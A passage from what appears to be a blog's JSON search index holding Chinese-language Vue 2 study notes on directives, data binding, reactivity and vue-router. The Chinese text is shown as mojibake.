keyç»™Vueè™šæ‹ŸDOMç®—æ³•diffä½¿ç”¨ï¼Œç”ŸæˆçœŸå®çš„DOMæ—¶:keyä¼šè¢«åˆ é™¤æ‰        indexä½œä¸ºkeyæ—¶ï¼Œæ¶‰åŠé€†åºæ’å…¥ã€é€†åºåˆ é™¤å…ƒç´ æ—¶ï¼Œ        ç»“æ„ä¸­å¦‚æœæœ‰ è¾“å…¥ç±»çš„DOM ä¼šäº§ç”Ÿæ­§ä¹‰ï¼Œäº§ç”Ÿé”™è¯¯DOMæ›´æ–°        å¯¼è‡´æ²¡æœ‰å¿…è¦çš„çœŸå®DOMæ›´æ–°    å¦‚æœä¸æ¶‰åŠç ´åé¡ºåºçš„æ“ä½œï¼Œä»…ç”¨äºæ¸²æŸ“åˆ—è¡¨å±•ç¤ºï¼Œå¯ä»¥ä½¿ç”¨:key = \"index\"  æ•°æ®ç»‘å®šå•é¡¹æ•°æ®ç»‘å®š v-bindâ€‹\té¡µé¢æ”¹å˜å€¼ï¼Œä¸ä¼šå½±å“Vue.dataä¸­çš„å€¼ï¼›Vue.dataä¸­çš„å€¼å¦‚æœæ”¹å˜ï¼Œé¡µé¢çš„å€¼ä¹Ÿä¼šåŠ¨æ€ç»‘å®šåŒå‘æ•°æ®ç»‘å®š V-modelâ€‹\té¡µé¢æ”¹å˜å€¼ï¼Œä¼šå½±å“Vue.dataçš„å€¼ï¼›åŒæ ·ç›¸å…³çš„é¡µé¢ä¹Ÿä¼šå˜åŒ–  åªèƒ½åº”ç”¨äº è¾“å…¥ç±»å…ƒç´  ï¼Œï¼ˆæœ‰valueå€¼çš„å…ƒç´ ï¼šinputç­‰ï¼‰è·å–å’Œè®¾ç½®è¡¨å•å…ƒç´ çš„å€¼ï¼ˆåŒå‘æ•°æ®ç»‘å®šï¼‰  ç®€å†™ï¼šv-model=\"messageâ€ ï¼Œç›´æ¥ç­‰äºå˜é‡åv-model:value=\"message\"  ç»‘å®šçš„æ•°æ®å’Œè¡¨è¾¾å…ƒç´ çš„å€¼ç›¸å…³è”è‡ªå®šä¹‰æŒ‡ä»¤      å‘½åï¼š                  è°ƒç”¨æ—¶ï¼šä½¿ç”¨ v-XXX        â€‹\tå¤šä¸ªå•è¯ç»„æˆæ—¶ï¼Œä¸è¯†åˆ«å¤§å†™å­—æ¯ï¼Œä½¿ç”¨ - åˆ†éš”                    å®šä¹‰æ—¶ï¼šä¸ç”¨åŠ  v- ï¼Œ ç›´æ¥XXX        â€‹\tå¤šä¸ªå•è¯ç»„æˆæ—¶ï¼Œä½¿ç”¨ â€˜å­—æ®µä¸²â€™ åŒ…èµ·æ¥è¡¨ç¤º                  thisæŒ‡å‘ â€” directivesçš„this éƒ½æŒ‡å‘window    ä½¿ç”¨Vueä¸­çš„æ•°æ®ï¼Œéœ€è¦ä»ç»‘å®šçš„æŒ‡ä»¤ä¸­ä¼ è¿‡æ¥        é’©å­å‡½æ•°ï¼š                  bindï¼šåªè°ƒç”¨ä¸€æ¬¡ï¼ŒæŒ‡ä»¤ç¬¬ä¸€æ¬¡ç»‘å®šåˆ°å…ƒç´ æ—¶è°ƒç”¨ã€‚                              ï¼ˆåœ¨å†…å­˜ä¸­å»ºç«‹å…³ç³»ï¼‰æ­¤æ—¶çš„å…ƒç´ è¿˜æœªåŠ è½½åˆ°é¡µé¢ï¼Œè®¸å¤šæ“ä½œæ— æ•ˆ                                å¯ä»¥è®¾ç½® æ ·å¼ã€å€¼ã€ç»‘å®šæ–¹æ³•ç­‰                                      insertedï¼šè¢«ç»‘å®šå…ƒç´ æ’å…¥çˆ¶èŠ‚ç‚¹æ—¶è°ƒç”¨ (ä»…ä¿è¯çˆ¶èŠ‚ç‚¹å­˜åœ¨ï¼Œä½†ä¸ä¸€å®šå·²è¢«æ’å…¥æ–‡æ¡£ä¸­)ã€‚                  å¯ä»¥è®¾ç½® è·å–ç„¦ç‚¹ã€æ“ä½œçˆ¶å…ƒç´ ç­‰                            updateï¼šæ‰€åœ¨ç»„ä»¶çš„ VNode æ›´æ–°æ—¶è°ƒç”¨ï¼Œä½†æ˜¯å¯èƒ½å‘ç”Ÿåœ¨å…¶å­ VNode æ›´æ–°ä¹‹å‰ã€‚                              å°†è¦†ç›– æ’å…¥é¡µé¢æ—¶çš„æŒ‡ä»¤æ•ˆæœ                                å†æ¬¡æ‰§è¡Œæ—¶ï¼Œå…ƒç´ å·²ç»åŠ è½½åˆ°é¡µé¢ä¸Šäº†                                      componentUpdatedï¼šæŒ‡ä»¤æ‰€åœ¨ç»„ä»¶çš„ VNode åŠå…¶å­ VNode å…¨éƒ¨æ›´æ–°åè°ƒç”¨ã€‚                    unbindï¼šåªè°ƒç”¨ä¸€æ¬¡ï¼ŒæŒ‡ä»¤ä¸å…ƒç´ è§£ç»‘æ—¶è°ƒç”¨ã€‚                  ä¼ å…¥çš„å‚æ•°          elementï¼šæŒ‡ä»¤æ‰€ç»‘å®šçš„å…ƒç´ ï¼Œå¯ä»¥ç”¨æ¥ç›´æ¥æ“ä½œ DOMã€‚      binding ï¼šä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å«ä»¥ä¸‹å±æ€§ï¼š                  nameï¼šæŒ‡ä»¤åï¼Œä¸åŒ…æ‹¬ v- å‰ç¼€ã€‚          valueï¼šæŒ‡ä»¤çš„ç»‘å®šå€¼                          ğŸ“œ ä¿å­˜ä¼ å…¥çš„JavaScript å¯¹è±¡å­—é¢é‡ï¼Œ{ color: 'white' } â€” binding.value.color å–å€¼                                expressionï¼šå­—ç¬¦ä¸²å½¢å¼çš„æŒ‡ä»¤è¡¨è¾¾å¼ã€‚ä¾‹å¦‚ v-my-directive=\"1 + 1\" ä¸­ï¼Œè¡¨è¾¾å¼ä¸º \"1 + 1\"ã€‚          argï¼šä¼ ç»™æŒ‡ä»¤çš„å‚æ•°ï¼Œå¯é€‰ã€‚ä¾‹å¦‚ v-my-directive:foo ä¸­ï¼Œå‚æ•°ä¸º \"foo\"ã€‚          modifiersï¼šä¸€ä¸ªåŒ…å«ä¿®é¥°ç¬¦çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼šv-my-directive.foo.bar ä¸­ï¼Œä¿®é¥°ç¬¦å¯¹è±¡ä¸º { foo: true, bar: true }ã€‚          oldValueï¼šæŒ‡ä»¤ç»‘å®šçš„å‰ä¸€ä¸ªå€¼ï¼Œä»…åœ¨ update å’Œ componentUpdated é’©å­ä¸­å¯ç”¨ã€‚æ— è®ºå€¼æ˜¯å¦æ”¹å˜éƒ½å¯ç”¨                    vnodeï¼šVue ç¼–è¯‘ç”Ÿæˆçš„è™šæ‹ŸèŠ‚ç‚¹ã€‚ç§»æ­¥ VNode API æ¥äº†è§£æ›´å¤šè¯¦æƒ…ã€‚      oldVnodeï¼šä¸Šä¸€ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼Œä»…åœ¨ update å’Œ componentUpdated é’©å­ä¸­å¯ç”¨ã€‚      // Vue å…¨å±€å®šä¹‰Vue.directive('æŒ‡ä»¤å',configObj)Vue.directive('æŒ‡ä»¤å',callBackFunction)// å½“å‰ç»„ä»¶ å±€éƒ¨å®šä¹‰new Vue({    directives: {        big: function (element, binding) {}  // å‡½æ•°å½¢å¼ï¼Œé»˜è®¤åªç”¨ bind + update        fbind: {} // å¯¹è±¡å½¢å¼ï¼Œå¯ä»¥é…ç½®å¤šé’©å­    } })       å‡½æ•°å½¢å¼ ä¸ å¯¹è±¡å½¢å¼çš„åŒºåˆ« â€” æ²¡æœ‰inserted                  è·å¾—ç„¦ç‚¹ï¼Œéœ€è¦è¯¥ç»“æ„å·²ç»åŠ è½½åˆ°é¡µé¢ä¸Šï¼›å¦åˆ™æ— æ³•è·å¾—ç„¦ç‚¹                    æ§åˆ¶çˆ¶å…ƒç´ ï¼Œéœ€è¦è¯¥ç»“æ„å·²ç»åŠ è½½åˆ°é¡µé¢ä¸Šï¼›å¦åˆ™ä¸çŸ¥é“è°æ˜¯çˆ¶å…ƒ        æœ‰ä¸€äº›æ“ä½œï¼Œéœ€è¦åœ¨è¯¥ç»“æ„æŒ‚è½½åˆ°DOMä¸Šï¼Œæ‰èƒ½æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒæ“ä½œ            "
  },
  
  {
    "title": "Vueå®ä¾‹",
    "url": "/posts/Vue%E5%AE%9E%E4%BE%8B/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-11 00:00:00 +0800",
    





    
    "snippet": "ä¸¤ä¸ªå‚æ•°â€‹\tã€Vueå®ä¾‹ä¸å¯¹è±¡çš„å…³ç³»æ˜¯ 1ï¼š1ã€‘ä¸€ä¸ªå®ä¾‹æ¥ç®¡ä¸€ä¸ªå®¹å™¨      åé¢çš„å®¹å™¨ä¸ç”Ÿæ•ˆã€é‡å¤çš„VueåŒæŒ‚è½½å®ä¾‹ä¼šæŠ¥é”™        å®¹å™¨åªèƒ½ä½¿ç”¨Vueå®ä¾‹æä¾›çš„å†…å®¹    ã€v.$mount(el, data); åœ¨å·²ç»å£°æ˜çš„Vueå®ä¾‹è¿½åŠ æŒ‚è½½ã€‘    elï¼š\"æŒ‚è½½ç‚¹\" æˆ–è€… document.getElementById('idå')  ï¼ˆå­—ç¬¦ä¸²ç±»å‹ï¼ŒæŒ‡å®šVueå®ä¾‹æœåŠ¡çš„å®¹å™¨ï¼‰ ...",
    "content": "ä¸¤ä¸ªå‚æ•°â€‹\tã€Vueå®ä¾‹ä¸å¯¹è±¡çš„å…³ç³»æ˜¯ 1ï¼š1ã€‘ä¸€ä¸ªå®ä¾‹æ¥ç®¡ä¸€ä¸ªå®¹å™¨      åé¢çš„å®¹å™¨ä¸ç”Ÿæ•ˆã€é‡å¤çš„VueåŒæŒ‚è½½å®ä¾‹ä¼šæŠ¥é”™        å®¹å™¨åªèƒ½ä½¿ç”¨Vueå®ä¾‹æä¾›çš„å†…å®¹    ã€v.$mount(el, data); åœ¨å·²ç»å£°æ˜çš„Vueå®ä¾‹è¿½åŠ æŒ‚è½½ã€‘    elï¼š\"æŒ‚è½½ç‚¹\" æˆ–è€… document.getElementById('idå')  ï¼ˆå­—ç¬¦ä¸²ç±»å‹ï¼ŒæŒ‡å®šVueå®ä¾‹æœåŠ¡çš„å®¹å™¨ï¼‰          ç¡®å®šå‘½ä¸­çš„å…ƒç´ åŠå…¶å†…éƒ¨çš„åä»£å…ƒç´       å»ºè®®ä½¿ç”¨idé€‰æ‹©å™¨      å¯ä»¥è®¾ç½®åŒæ ‡ç­¾(é™¤äº†htmlå’Œbodyæ ‡ç­¾)        data: æ•°æ® ï¼ˆè¢«elæŒ‚è½½çš„å®¹å™¨ï¼Œæ‰å¯ä»¥ä½¿ç”¨dataé‡Œé¢çš„æ•°æ®ï¼‰          å¯ä»¥å†™å¤æ‚ç±»å‹ å¯¹è±¡ï¼š objã€æ•°ç»„arrayã€å‡½æ•°methodç­‰      data()ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä½¿ç”¨äº†é—­åŒ…ï¼Œå¿…é¡»è¿”å›ä¸€ä¸ªå¯¹è±¡                  è®©å•é¡µé¢çš„Vueè¾¾åˆ°å„ä¸ªç»„ä»¶æœ‰ç‹¬ç«‹çš„ç§æœ‰å˜é‡ç©ºé—´ï¼Œä»è€Œä¸ä¼šç›¸äº’å½±å“æ±¡æŸ“å…¨å±€          ä¸å»ºè®®ä½¿ç”¨äº†çº¯å¯¹è±¡ï¼Œä½¿å¾—åŒåå¯¹è±¡æŒ‡å‘åŒä¸€ä¸ªå†…å­˜ç©ºé—´åœ°å€ï¼Œäº’ç›¸å¹²æ‰°          æ­¤å¤„çš„thisæŒ‡å‘vueå®ä¾‹å¯¹è±¡ â€” Vueè°ƒç”¨dataå‡½æ•°                    åœ¨é¡µé¢å®¹å™¨å†…ä½¿ç”¨dataçš„å€¼ {{jsè¡¨è¾¾å¼ï¼ˆä¼šè¿”å›å€¼çš„jsä»£ç ï¼‰ / dataå˜é‡å}}      dataå†…çš„å†…å®¹ï¼Œä¼šè¿›è¡Œæ•°æ®ä»£ç†ã€æ•°æ®åŠ«æŒ      /* Vue.dataçš„å†™æ³•*/new Vue({\tel:'#idName',\tdata: { } /* å¯¹è±¡å†™æ³• */\tdata(){   /* åŒ¿åå‡½æ•°å†™æ³• */\t\treturn{ name: \"\" }\t\t}\tdata:function(){ /* å‡½æ•°å†™æ³• */        return{ name:\"\" }    }\t/* ä¸€å®šä¸èƒ½ç”¨ ç®­å¤´å‡½æ•°å†™æ³•ï¼Œç®­å¤´å‡½æ•°æ²¡æœ‰thisï¼Œå‘ä¸Šçº§æ‰¾this=windowæ˜¯é”™è¯¯çš„ï¼Œåº”è¯¥æ˜¯Vueå®ä¾‹è°ƒç”¨ */})  Vueå®ä¾‹çš„ä½œç”¨èŒƒæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ  æ˜¯å¦å¯ä»¥ä½¿ç”¨å…¶ä»–çš„é€‰æ‹©å™¨ï¼Ÿ  æ˜¯å¦å¯ä»¥è®¾ç½®å…¶ä»–çš„domå…ƒç´ å‘¢ï¼Ÿæ¨¡å—è¯­æ³•  æ’å€¼è¯­æ³•   {{% jsè¡¨è¾¾å¼ %}}          ç»™æ ‡ç­¾ä½“å†…å®¹åŠ¨æ€æŒ‡å®šdataé‡Œé¢çš„å€¼ â€” dataæœ€åä¼šæŒ‚è½½åˆ°Vueå®ä¾‹ä¸Šï¼Œæ‰€ä»¥ â€”      ä½œä¸ºä¸€ä¸ªVueå®ä¾‹ï¼Œå¯ä»¥è®¿é—®åˆ°å®ä¾‹é‡Œé¢çš„æ‰€æœ‰å±æ€§å€¼ï¼ˆåŒ…æ‹¬åŸå‹ï¼‰ï¼š {{ $children / å±æ€§å }}        æŒ‡ä»¤è¯­æ³• â€” ç»™æ ‡ç­¾åŠ¨æ€æŒ‡å®šä½“å†…å®¹ã€å±æ€§ã€æ–¹æ³• â€” &lt;a :href=\" jsè¡¨è¾¾å¼ \"&gt;&lt;/a&gt; æˆ– v-bind:href=\" jsè¡¨è¾¾å¼ \"          è§£ææ ‡ç­¾ï¼ˆå½“æ‰€åœ¨çš„æ¨¡æ¿é‡æ–°è§£æå¼ï¼Œå°†è¢«è°ƒç”¨ï¼‰ â€” åŒ…æ‹¬æ ‡ç­¾å±æ€§ ã€ä½“å†…å®¹ã€ç»‘å®šäº‹ä»¶æ–¹æ³•ç­‰      å¯ä»¥è¯»å–åˆ°dataä¸­çš„æ‰€æœ‰å±æ€§      æ•°æ®ä»£ç†å¯¹è±¡æ·»åŠ å±æ€§ defineProperty()â€‹\tObject.defineProperty( ObjectName, \"å±æ€§å\", {value: å±æ€§å€¼})â€‹\tè¯¥å±æ€§å€¼ä¸å¯ä»¥æšä¸¾ Object.keys(person)è¯»å–ä¸åˆ°  ä½¿ç”¨åœºæ™¯ï¼šæ•°æ®åŠ«æŒã€è®¡ç®—å±æ€§ã€æ•°æ®ä»£ç†Vueçš„æ•°æ®ä»£ç†â€‹\té€šè¿‡ä¸€ä¸ªå¯¹è±¡çš„ä»£ç†å¯¹å¦ä¸€ä¸ªå¯¹è±¡ä¸­å±æ€§çš„æ“ä½œï¼ˆè¯»ã€å†™ï¼‰let obj = { x:100; }let obj2 = { y:200; }Object.defineProperty(obj2,'x',{\tget(){\t\treturn obj.x; // obj2åŸæœ¬æ²¡æœ‰xå±æ€§å€¼ï¼Œå®ƒæ‹¿obj.xå€¼ä½œä¸ºè‡ªå·±çš„å€¼    },    set(value){        obj.x = value;  // å½“æœ‰äººä¿®æ”¹obj2.xçš„å€¼æ—¶ï¼Œå°±æ˜¯ä¿®æ”¹obj.xçš„å€¼    }})console.log(obj2.x); // 100  obj2.x = 39;      // é€šè¿‡obj2çš„ä»£ç†ï¼Œå®ç°äº†objä¸­å±æ€§çš„æ“ä½œconsole.log(obj.x); // 39â€‹\tåœ¨Vueä¸­ï¼Œå®ä¾‹vm.dataçš„å€¼ï¼Œåœ¨å®é™…ä¸­å­˜æ”¾åœ¨ Â·vm._dataä¸­ï¼Œå…¶æ•°æ®åŠ«æŒçš„å®ç°åŠŸèƒ½ï¼šâ€‹\t\t\t\tvm._dataå­˜åœ¨ä¸€ä¸ªæ•°æ®åŠ«æŒï¼ˆåŠ«æŒå®ç° æ•°æ®å˜åŠ¨ï¼Œé¡µé¢ä¿®æ”¹ï¼‰ï¼›  vmè¦ä¿®æ”¹ _dataä¸­çš„å€¼ï¼Œä¼šåœ¨é‡Œé¢æ·»åŠ name:getterå±æ€§ï¼Œå¯ä»¥ç›´æ¥vm.name==19;ä¿®æ”¹dataé‡Œé¢çš„å±æ€§å€¼  vmè¦è¯»å– _dataä¸­çš„å€¼ï¼Œä¼šåœ¨é‡Œé¢æ·»åŠ name:setterå±æ€§ï¼Œå¯ä»¥ä»¥``è¯»å–åˆ°dataé‡Œé¢çš„å±æ€§å€¼â€‹\tåˆ›å»ºå®ä¾‹æ—¶ä¼ å…¥çš„é…ç½®å¯¹è±¡ç§°ä¸ºoptionsï¼Œå–é‡Œé¢çš„å€¼çš„åšoptions.dataâ€‹\tã€é€šè¿‡vmå¯¹è±¡ï¼Œä»£ç†dataå¯¹è±¡ä¸­çš„å±æ€§æ“ä½œã€‘const vm = new Vue({    el:'#root',    data:{        name:\"æå››;    }})vm.name = \"ç‹äº”\"; // vm.name è§¦å‘äº†nameå±æ€§çš„setterï¼Œå…¶ä¿®æ”¹äº†dataä¸­çš„å€¼å˜åŒ–// é¡µé¢ä¸­çš„æ•°æ®ä¹Ÿä¼šæ”¹å˜â€‹\té¡µé¢ä¸­``ä¸ºæå››ï¼Œå½“ä¿®æ”¹ vm.name = 'æå››' æ—¶ï¼Œdataä¸­çš„æ•°æ®ä¼šå˜åŒ–ï¼Œæ•°æ®åŠ«æŒ  è§‚å¯Ÿè€…æ¨¡å¼â€‹\tå¦‚æœæœ‰æ”¹åŠ¨_data_ â€” å³è°ƒç”¨.setï¼Œåˆ™ä¼šè°ƒç”¨è§†å›¾æ›´æ–°  ä½¿ç”¨å®šæ—¶å™¨ç›‘è§†æ•°æ®å˜åŠ¨var data = {    name: 'nni',    address: 'ndd',    list:[1,2,3,4],    obj:{name:1,age:2}}// ç›‘è§†æ”¹å€¼-- åªèƒ½ç›‘è§†ä¸€ä¸ªå˜é‡ï¼Œæ‰§è¡Œæ“ä½œvar tmp = 'nni'setInterval(() =&gt; {    if (data.name !== tmp) {        tmp = data.name;        console.log('data.nameè¢«ä¿®æ”¹ï¼Œéœ€è¦æ›´æ–°è§†å›¾äº†');    }}, 1000); // ç¨‹åºä¸€ç›´åœ¨æ‰§è¡Œ  æ‰‹åŠ¨æ·»åŠ  getã€set â€” é™·å…¥æ­»å¾ªç¯// what? -- æ‰‹åŠ¨ç»™dataæ·»åŠ  getã€set// how? -- å°†ä¼šé™·å…¥æ­»å¾ªç¯// why? --Object.defineProperty(data,'name',{    get(){        return data.name; // `.` == get(), å¯¼è‡´ä¸æ–­å›è°ƒ get()    },    set( val ){        data.name = val // `=` == set(), å¯¼è‡´ä¸æ–­å›è°ƒ set()    }})  è§‚å¯Ÿè€…æ¨¡å¼// å®šä¹‰è§‚å¯Ÿæ¨¡å¼function Observer(obj) {    const keys = Object.keys(obj); // æ‹¿åˆ°objèº«ä¸Šçš„æ‰€æœ‰å±æ€§    keys.forEach((key) =&gt; { // ç®­å¤´å‡½æ•°ï¼ŒthisæŒ‡å‘Observerç±»        Object.defineProperty(this, key, {  // åœ¨Observerç±»ä¸Šæ·»åŠ  objä¸Šæœ‰çš„å±æ€§ï¼Œå¹¶ç»™æ¯ä¸€ä¸ªå±æ€§å¢åŠ getã€set            get() { return obj[key] },            set(val) {                 obj[key] = val;                // å±æ€§å€¼è¢«ä¿®æ”¹ï¼Œæ›´æ–°è§†å›¾                // updateView(JSON.parse(JSON.stringify(obj[key] = val)));                if(obj[key] instanceof Array){                    console.log('array');                    vm.$set(obj,obj[key],val);                }else if(obj[key] instanceof Object){                    console.log('obj');                    vm.$set(obj,obj[key],val);                }else{                    vm.$set(obj,obj[key],val);                }            }            // thisæ˜¯Observerï¼Œé¿å…äº†è°ƒç”¨å’Œè¯»å–éƒ½æ˜¯dataå¯¼è‡´çš„æ­»å¾ªç¯        })    });}// åˆ›å»ºä¸€ä¸ªè§‚å¯Ÿè€…var obs = new Observer(data); // dataä¸­çš„æ•°æ®è¢«è§‚å¯Ÿè€…ç›‘è§†// var vm = {} // æ¨¡æ‹ŸVueå®ä¾‹å¯¹è±¡vm._data = data = obs;è§†å›¾ç›‘è§†æ•°æ®æ›´æ–°â€‹\tVueä¼šç›‘è§†dataä¸­ æ‰€æœ‰å±‚çº§ çš„æ•°æ®  é€šè¿‡set()å®ç°ç›‘è§†          è¦åœ¨ new Vue æ—¶ä¼ å…¥éœ€è¦ç›‘æµ‹çš„æ•°æ®ï¼Œæ‰èƒ½å®ç°æ£€æµ‹      å¯¹è±¡ã€æ•°ç»„ä¸­è¿½åŠ çš„å±æ€§ï¼ŒVueé»˜è®¤ä¸åšå“åº”å¼å¤„ç†        å¯¹è±¡æ·»åŠ å±æ€§å“åº”å¼ï¼š          Vue.set(target, propertyName/index, value)      vm.$set(target, propertyName/index, value)        æ•°ç»„æ·»åŠ å…ƒç´ å“åº”å¼ï¼š          é€šè¿‡é‡å†™æ•°ç»„ æ›´æ–°å…ƒç´  çš„æ–¹æ³•ï¼Œå®ç°å“åº”å¼ï¼š                  è°ƒç”¨åŸç”Ÿå¯¹åº”çš„æ–¹æ³•ï¼Œå¯¹æ•°ç»„è¿›è¡Œæ›´æ–°          é‡æ–°è§£ææ¨¡æ¿ï¼Œå¯¹æ¯”ä¸åŒï¼Œè¿›è€Œæ›´æ–°é¡µé¢                    å¿…é¡»è°ƒç”¨ åŸç”Ÿçš„æ›´æ–°åŸç”Ÿæ–¹æ³• ï¼špush() pop() shfit() unshift() splice() sort() reverse()      æˆ–è€…ä½¿ç”¨ Vue.set() å’Œ vm.$set() æ–¹æ³•        æ•°ç»„ä½¿ç”¨ ä¸å½±å“åŸæ•°ç»„çš„æ–¹æ³•ï¼ˆfilterã€concatã€:warning: Vue.set() å’Œ vm.$set ä¸èƒ½ç»™vmæˆ–vmçš„æ ¹æ•°æ®å¯¹è±¡ï¼ˆåŒ…æ‹¬_data_ï¼‰æ·»åŠ å“åº”å¼å±æ€§methods: {    addObjSex() {        this.$set(this.student, 'sex', \"ç”·\")        Vue.set(this.student,'sex','ç”·')    },    addArrFri() {        this.student.friends.unshift({name:'anmy',age:28})        this.$set(this.student,'friends',[{name:'anmy',age:28},...this.student.friends])        Vue.set(this.student, 'friends', [{ name: 'anmy', age: 28 }, ...this.student.friends])    },    updateArrFri() {        this.student.friends.splice(0, 1, { name: \"å¼ ä¸‰\", age: 93 })        this.student.friends[0].name = \"å¼ ä¸‰\"  // students.friends ä½œä¸ºæ•°ç»„æ²¡æœ‰ getã€setï¼›ä½†æ•°ç»„é¡¹çš„å±æ€§æœ‰    },    addArrHobby() {        this.student.hobby.push('å­¦ä¹ ')\t    },    updateArrHobby() {        this.student.hobby.splice(0,1,'å¼€è½¦')        this.$set(this.student.hobby, 0, 'å¼€è½¦')    },    removeArrHobby() {        let hob = JSON.parse(JSON.stringify(this.student.hobby))        let newHob = hob.filter((item) =&gt; {            if(item !== 'æŠ½çƒŸ'){                console.log(item);                return item            }        })        this.student.hobby = newHob; // å°†Vue._dataä¸­çš„æ•°æ®ç›´æ¥æ›¿æ¢æ‰ï¼Œè§¦å‘é¡µé¢æ›´æ–°    }}"
  },
  
  {
    "title": "Vueè·¯ç”±",
    "url": "/posts/Vue%E8%B7%AF%E7%94%B1/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-07 00:00:00 +0800",
    





    
    "snippet": "å®˜æ–¹æ–‡æ¡£â€“Vue.Routerå®ç°ç»„ä»¶ä¹‹é—´çš„è·³è½¬ï¼šé€šè¿‡è·¯ç”±æ¨¡å—ï¼Œå°†æŒ‡å®šçš„ç»„ä»¶æ˜¾ç¤ºåœ¨è·¯ç”±è§†å›¾ä¸­ï¼Œå®ç°ä¸€ä¸ªVUEç»„ä»¶ä¸­å…¶ä»–ç»„ä»¶ç›¸äº’åˆ‡æ¢å®‰è£…è·¯ç”±æ¨¡å—  å·²æœ‰é¡¹ç›®æ·»åŠ npm  æ–°å»ºé¡¹ç›®æ·»åŠ npm install vue-router -s  å®‰è£…ä¾èµ–routeï¼Œroutesï¼Œrouteråœ¨ä½¿ç”¨äº†vue-routerçš„åº”ç”¨ä¸­ï¼Œè·¯ç”±å¯¹è±¡ä¼šè¢«æ³¨å…¥æ¯ä¸ªç»„ä»¶ä¸­ï¼Œèµ‹å€¼ä¸ºthis.routeå¯¹è±¡è·å–çš„. å¹¶ä¸”å½“è·¯...",
    "content": "å®˜æ–¹æ–‡æ¡£â€“Vue.Routerå®ç°ç»„ä»¶ä¹‹é—´çš„è·³è½¬ï¼šé€šè¿‡è·¯ç”±æ¨¡å—ï¼Œå°†æŒ‡å®šçš„ç»„ä»¶æ˜¾ç¤ºåœ¨è·¯ç”±è§†å›¾ä¸­ï¼Œå®ç°ä¸€ä¸ªVUEç»„ä»¶ä¸­å…¶ä»–ç»„ä»¶ç›¸äº’åˆ‡æ¢å®‰è£…è·¯ç”±æ¨¡å—  å·²æœ‰é¡¹ç›®æ·»åŠ npm  æ–°å»ºé¡¹ç›®æ·»åŠ npm install vue-router -s  å®‰è£…ä¾èµ–routeï¼Œroutesï¼Œrouteråœ¨ä½¿ç”¨äº†vue-routerçš„åº”ç”¨ä¸­ï¼Œè·¯ç”±å¯¹è±¡ä¼šè¢«æ³¨å…¥æ¯ä¸ªç»„ä»¶ä¸­ï¼Œèµ‹å€¼ä¸ºthis.routeå¯¹è±¡è·å–çš„. å¹¶ä¸”å½“è·¯ç”±åˆ‡æ¢æ—¶ï¼Œè·¯ç”±å¯¹è±¡ä¼šè¢«æ›´æ–°ã€‚  routeï¼šé¦–å…ˆå®ƒæ˜¯ä¸ªå•æ•°ï¼Œè¯‘ä¸ºè·¯ç”±ï¼Œå³æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºå•ä¸ªè·¯ç”±æˆ–è€…æŸä¸€ä¸ªè·¯ç”±ï¼›  routesï¼šå¤šä¸ªè·¯ç”±çš„é›†åˆï¼Œæ˜¯ä¸€ä¸ªæ•°ç»„  routerï¼šè¯‘ä¸ºè·¯ç”±å™¨ï¼Œä¸ºVueRouterå®ä¾‹ï¼Œå®¹å™¨åŒ…å«ä¸Šè¿°ä¸¤ä¸ªæˆ–è€…è¯´å®ƒæ˜¯ä¸€ä¸ªç®¡ç†è€…ï¼Œè´Ÿè´£ç®¡ç†ä¸Šè¿°ä¸¤ä¸ª          router.pushå®ç°å¯¼èˆªåˆ°ä¸åŒURL      $router ä¸ºå½“å‰routerè·³è½¬å¯¹è±¡é‡Œé¢, å¯è·å–nameã€pathã€queryã€paramsç­‰      å½“ç”¨æˆ·åœ¨é¡µé¢ä¸Šç‚¹å‡»æŒ‰é’®çš„æ—¶å€™ï¼Œè¿™ä¸ªæ—¶å€™routerå°±ä¼šå»routesä¸­å»æŸ¥æ‰¾routeï¼Œå°±æ˜¯è¯´è·¯ç”±å™¨ä¼šå»è·¯ç”±é›†åˆä¸­æ‰¾å¯¹åº”çš„è·¯ç”±é™æ€è·¯ç”±è¡¨åœ¨srcä¸‹åˆ›å»ºroutes.js// routers.jsimport Home from '@/components/Home. vueimport User from '@/components/user/user. vueexport const routes= [\t//æš´éœ²ä¸€ä¸ªé™æ€çš„è·¯ç”±    { path: '/', component: Home}.    { path:'/user', component: User}]å¼•å…¥å¹¶ä½¿ç”¨åœ¨main.jsä¸­å¼•å…¥è·¯ç”±æ¨¡å—// main.jsimport Vue from 'vue'import App from './App.vue'import router from './router' // å¼•å…¥æ¨¡å—ä¼ é€’å‚æ•°çš„æ–¹å¼ä¼ é€’å‚æ•°ä¸»è¦æœ‰ä¸¤ç§ç±»å‹: paramså’Œquery  this.$router.push()è·¯ç”±ä¼ å€¼å’Œè·å–çš„ä¸¤ç§å¸¸è§æ–¹æ³•paramsçš„ç±»å‹:  é…ç½®è·¯ç”±æ ¼å¼: /router/:idconst routes = [{\t\tpath: '/profile/:id',\t\tcomponent: profile\t}]  ä¼ é€’çš„æ–¹å¼: åœ¨pathåé¢è·Ÿä¸Šå¯¹åº”çš„å€¼&lt;router-link :to=\"{      path:'/profile/'+123,      query:{name:'why',age:18}    }\"&gt;\tæ¡£æ¡ˆ &lt;/router-link&gt;  ä¼ é€’åå½¢æˆçš„è·¯å¾„: /router/123, /router/abcqueryçš„ç±»å‹:  é…ç½®è·¯ç”±æ ¼å¼: /router, ä¹Ÿå°±æ˜¯æ™®é€šé…ç½®  ä¼ é€’çš„æ–¹å¼: å¯¹è±¡ä¸­ä½¿ç”¨queryçš„keyä½œä¸ºä¼ é€’æ–¹å¼&lt;button @click=\"toProfile\"&gt;æ¡£æ¡ˆ&lt;/button&gt;\t&lt;!-- ç»“åˆJavaScript--&gt;export default {  methods: {    toProfile(){      this.$router.push({        \"path\":'/profile/'+456,        \"query\":{\"name\":'why', \"age\":'19'}      })    }  }  ä¼ é€’åå½¢æˆçš„è·¯å¾„: /router?id=123, /router?id=abcè·¯ç”±ä½¿ç”¨å‚æ•°è·¯ç”±ä½¿ç”¨å‚æ•°æœ‰ä¸¤ç§æ–¹å¼:&lt;router-link&gt;å’ŒJavaScript&lt;router-link&gt;æ–¹å¼&lt;template&gt;\t//åœ¨profileç»„ä»¶ä¸­  &lt;div&gt;    